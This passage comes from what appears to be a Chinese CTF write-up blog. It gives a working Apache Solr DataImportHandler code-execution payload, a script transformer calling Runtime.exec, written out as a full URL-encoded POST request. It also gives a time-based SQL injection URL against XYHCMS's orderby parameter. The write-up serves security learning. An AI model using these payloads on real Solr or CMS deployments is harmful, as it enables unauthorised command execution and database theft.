</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>212</span>
</span></span><span class=line><span class=cl><span class=n>content-type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=------------------------aceb88c2159f183f</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--------------------------aceb88c2159f183f
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;stream.body&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;RDF&gt;
</span></span><span class=line><span class=cl>&lt;item/&gt;
</span></span><span class=line><span class=cl>&lt;/RDF&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--------------------------aceb88c2159f183f--
</span></span></code></pre></div><p>其中 urlencode 部分是：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;dataConfig&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;dataSource</span> <span class=na>name=</span><span class=s>&#34;streamsrc&#34;</span> <span class=na>type=</span><span class=s>&#34;ContentStreamDataSource&#34;</span> <span class=na>loggerLevel=</span><span class=s>&#34;TRACE&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;script&gt;</span><span class=cp>&lt;![CDATA[
</span></span></span><span class=line><span class=cl><span class=cp>          function poc(row){
</span></span></span><span class=line><span class=cl><span class=cp> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&#34;ifconfig&#34;).getInputStream()));
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>var result = [];
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>while(true) {
</span></span></span><span class=line><span class=cl><span class=cp>var oneline = bufReader.readLine();
</span></span></span><span class=line><span class=cl><span class=cp>result.push( oneline );
</span></span></span><span class=line><span class=cl><span class=cp>if(!oneline) break;
</span></span></span><span class=line><span class=cl><span class=cp>}
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>row.put(&#34;title&#34;,result.join(&#34;\n\r&#34;));
</span></span></span><span class=line><span class=cl><span class=cp>return row;
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>}
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>]]&gt;</span><span class=nt>&lt;/script&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;document&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;entity</span>
</span></span><span class=line><span class=cl>        <span class=na>stream=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>name=</span><span class=s>&#34;entity1&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>datasource=</span><span class=s>&#34;streamsrc1&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>processor=</span><span class=s>&#34;XPathEntityProcessor&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>rootEntity=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>forEach=</span><span class=s>&#34;/RDF/item&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>transformer=</span><span class=s>&#34;script:poc&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>             <span class=nt>&lt;field</span> <span class=na>column=</span><span class=s>&#34;title&#34;</span> <span class=na>xpath=</span><span class=s>&#34;/RDF/item/title&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/entity&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/document&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/dataConfig&gt;</span>
</span></span></code></pre></div><p>利用 ContentStreamDataSource 把 stream.body 作为数据源进行处理。其实看到这，再根据文章中所描述的：</p><blockquote><p>​ 在相关概念中说到了ContentStreamDataSource能接收Post数据作为数据源，结合第一阶段说到的dynamicField就能实现回显了。</p></blockquote><p>其实我们的 POC 也呼之欲出了。</p><p>只要去掉 stream.body ，使用 POST XML 作为数据源，再配合 dynamicField 的特性，就可以把回显输出到 document 当中了。</p><p>于是我们可以大概这么去构造 dataConfig</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;dataConfig&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;dataSource</span> <span class=na>name=</span><span class=s>&#34;streamsrc&#34;</span> <span class=na>type=</span><span class=s>&#34;ContentStreamDataSource&#34;</span> <span class=na>loggerLevel=</span><span class=s>&#34;TRACE&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;script&gt;</span><span class=cp>&lt;![CDATA[
</span></span></span><span class=line><span class=cl><span class=cp>          function poc(row){
</span></span></span><span class=line><span class=cl><span class=cp> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&#34;ls&#34;).getInputStream()));
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>var result = [];
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>while(true) {
</span></span></span><span class=line><span class=cl><span class=cp>var oneline = bufReader.readLine();
</span></span></span><span class=line><span class=cl><span class=cp>result.push( oneline );
</span></span></span><span class=line><span class=cl><span class=cp>if(!oneline) break;
</span></span></span><span class=line><span class=cl><span class=cp>}
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>row.put(&#34;id&#34;,result.join(&#34;\n\r&#34;));
</span></span></span><span class=line><span class=cl><span class=cp>return row;
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>}
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>]]&gt;</span><span class=nt>&lt;/script&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;document&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;entity</span>
</span></span><span class=line><span class=cl>        <span class=na>name=</span><span class=s>&#34;streamxml&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>datasource=</span><span class=s>&#34;streamsrc1&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>processor=</span><span class=s>&#34;XPathEntityProcessor&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>forEach=</span><span class=s>&#34;/RDF/item&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>transformer=</span><span class=s>&#34;script:poc&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;field</span> <span class=na>column=</span><span class=s>&#34;id&#34;</span> <span class=na>xpath=</span><span class=s>&#34;/RDF/item/id&#34;</span> <span class=na>name=</span><span class=s>&#34;id_s&#34;</span> <span class=na>type=</span><span class=s>&#34;string&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/entity&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/document&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/dataConfig&gt;</span>
</span></span></code></pre></div><p>直接利用默认配置的 id fileld 进行回显，然后将之前 stream body 的改成 xml 发送 post 请求即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/solr/test1/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test1&amp;name=dataimport&amp;dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ls%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22id%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22id%22%20xpath%3D%22%2FRDF%2Fitem%2Fid%22%20name%3D%22id_s%22%20type%3D%22string%22%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv:8983</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>62</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/xml;charset=utf-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;RDF&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;item/&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/RDF&gt;</span>
</span></span></code></pre></div><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000752.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000752.png loading=lazy></a></figure></p><p>这样我们就成功构造了回显，然后用 smuggling 方法发送上面的请求就可以了。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000857.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000857.png loading=lazy></a></figure></p><p>给比我做的快的师傅递茶tql，自己还是做的太慢了orz&mldr;</p><p><strong>文中的POC仅供本次做题学习交流，切勿用于非法用途</strong></p><h2 id=easyweb>easyweb</h2><p>当时做完 bank_service 就去睡了，第二天醒来就结束就没看这道题，后来问了问前几的师傅们，是个 sql 注入的题。</p><p>一个CMS，官网是<a class=link href=http://www.xyhcms.com/ target=_blank rel=noopener>行云海CMS</a>，题目是最新的版本，然后我去看了一下，主要问题在<code>App/Api/Controller/LtController.class.php</code>当中，有好几个地方，比如</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>gbooklist</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=o>...</span>
</span></span><span class=line><span class=cl>	<span class=nv>$order_by</span>  <span class=o>=</span> <span class=nx>I</span><span class=p>(</span><span class=s1>&#39;orderby&#39;</span><span class=p>,</span> <span class=s1>&#39;id DESC&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>...</span>
</span></span><span class=line><span class=cl>	<span class=nv>$_list</span> <span class=o>=</span> <span class=nx>M</span><span class=p>(</span><span class=s1>&#39;guestbook&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=nv>$where</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>order</span><span class=p>(</span><span class=nv>$order_by</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>limit</span><span class=p>(</span><span class=nv>$limit</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>select</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>对于 I 函数第二个参数并没有做任何的处理</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * 获取输入参数 支持过滤和默认值
</span></span></span><span class=line><span class=cl><span class=sd> * 使用方法:
</span></span></span><span class=line><span class=cl><span class=sd> * &lt;code&gt;
</span></span></span><span class=line><span class=cl><span class=sd> * I(&#39;id&#39;,0); 获取id参数 自动判断get或者post
</span></span></span><span class=line><span class=cl><span class=sd> * I(&#39;post.name&#39;,&#39;&#39;,&#39;htmlspecialchars&#39;); 获取$_POST[&#39;name&#39;]
</span></span></span><span class=line><span class=cl><span class=sd> * I(&#39;get.&#39;); 获取$_GET
</span></span></span><span class=line><span class=cl><span class=sd> * &lt;/code&gt;
</span></span></span><span class=line><span class=cl><span class=sd> * @param string $name 变量的名称 支持指定类型
</span></span></span><span class=line><span class=cl><span class=sd> * @param mixed $default 不存在的时候默认值
</span></span></span><span class=line><span class=cl><span class=sd> * @param mixed $filter 参数过滤方法
</span></span></span><span class=line><span class=cl><span class=sd> * @param mixed $datas 要获取的额外数据源
</span></span></span><span class=line><span class=cl><span class=sd> * @return mixed
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>I</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$default</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$filter</span><span class=o>=</span><span class=k>null</span><span class=p>,</span><span class=nv>$datas</span><span class=o>=</span><span class=k>null</span><span class=p>)</span>
</span></span></code></pre></div><p>于是我们可以访问<code>index.php?s=Api/lt/gbooklist&orderby=1;SELECT SLEEP(5)%23</code>得到明显的时间延迟，这里我们就可以直接用 sqlmap 时间盲注就行了。</p><p>同样的，该文件里的<code>taglist</code>/<code>alist</code>/<code>slist</code>/<code>reviewlist</code>函数都有相同的地方存在注入，该题的 flag 也在数据库里面，所以用 sqlmap 跑跑就出来了。</p><p><strong>文中的POC仅供本次做题学习交流，切勿用于非法用途</strong></p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/2022/01/08/2022-01-08-TheEndOfLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/2021/12/27/2021-12-20-ANewNovelLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/2021/08/02/cybrics-checkin-2021/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/2021/07/21/google-qual-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2023 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#ticket_system>Ticket_System</a></li><li><a href=#bank_service>bank_service</a><ol><li><a href=#侧信道攻击>侧信道攻击</a></li><li><a href=#稍加思索>稍加思索</a></li></ol></li><li><a href=#easyweb>easyweb</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>